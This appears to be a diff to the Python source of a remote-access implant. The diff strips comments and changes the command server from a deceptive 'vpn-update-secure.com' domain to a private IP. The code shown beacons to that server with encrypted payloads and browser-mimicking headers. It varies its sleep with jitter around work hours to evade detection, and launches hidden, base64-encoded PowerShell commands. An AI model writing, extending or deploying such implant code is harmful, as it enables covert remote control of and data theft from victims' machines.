@@ -10,8 +10,8 @@ import traceback
 import platform
 from Encryption import encrypt_data, decrypt_data
 from curl_cffi.requests import Session
-#Configuration
-SERVER = 'http://vpn-update-secure.com:5000' # YOUR SERVER IP
+
+SERVER = '172.27.232.194:5000' 
 BEACON_ENDPOINT = "/api/beacon"
 RESULT_ENDPOINT = '/api/result'
 SLEEP_MIN= 10
@@ -65,7 +65,7 @@ def get_session():
             "Sec-Fetch-Dest": "empty",
             "Sec-Fetch-Mode": "cors",
             "Sec-Fetch-Site": "same-origin",
-            "Priority": "u=1, i",  # Chrome-like priority (2025+)
+            "Priority": "u=1, i",  
         }
     elif family in ("safari", "safari_ios"):
         headers = {
@@ -76,7 +76,7 @@ def get_session():
             "Sec-Fetch-Dest": "empty",
             "Sec-Fetch-Mode": "cors",
             "Sec-Fetch-Site": "same-origin",
-            "Priority": "u=0",  # Safari-like
+            "Priority": "u=0",  
         }
         if family == "safari_ios":
             headers["Sec-Ch-Ua-Platform"] = '"iOS"'
@@ -92,7 +92,7 @@ def dynamic_sleep():
 
     if 9 <= current_hour <= 17: #Work Hours
         sleep_time =  random.randint(SLEEP_MIN, SLEEP_MAX)
-    else: #Nights/Weekends
+    else: 
         sleep_time =  random.randint(SLEEP_MIN * 2 ,SLEEP_MAX * 3)
     jitter = sleep_time * 0.1 * (random.random() - 0.5)
     return max(0, sleep_time + int(jitter))
@@ -106,7 +106,7 @@ def beacon():
             session = get_session()
             headers = {
                 "Authorization": f"Bearer {AGENT_ID}",
-                "X-Session": str(uuid.uuid4())  # Ekstra session tracking header
+                "X-Session": str(uuid.uuid4()) 
             }
             payload = {"id": AGENT_ID}
             plain_json = json.dumps(payload)
@@ -244,7 +244,6 @@ def run_powershell(command, session):
     $output | Out-String
     '''
 
-    # PYTHON ile Base64 encode yap
     import base64
     encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
     full_cmd = f'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {encoded}'
